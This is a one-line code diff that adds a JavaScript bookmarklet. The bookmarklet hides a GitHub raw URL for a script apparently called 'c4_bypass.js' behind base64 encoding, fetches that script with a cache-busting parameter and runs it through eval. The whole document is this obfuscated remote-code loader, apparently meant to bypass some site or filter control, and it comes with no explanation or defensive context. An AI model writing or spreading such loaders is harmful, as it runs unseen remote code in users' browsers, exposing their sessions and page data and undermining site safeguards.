@@ -1,0 +1,1 @@
+javascript:(function(){var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vdmFjaHJvbm8wOS9jNC1ieXBhc3MvbWFpbi9jNF9ieXBhc3MuanM='];fetch(atob(a[0])+'?t='+Date.now().toString(36)).then(r=>r.text()).then(t=>eval(t)).catch(e=>alert('C4 Load Failed: '+e));})();
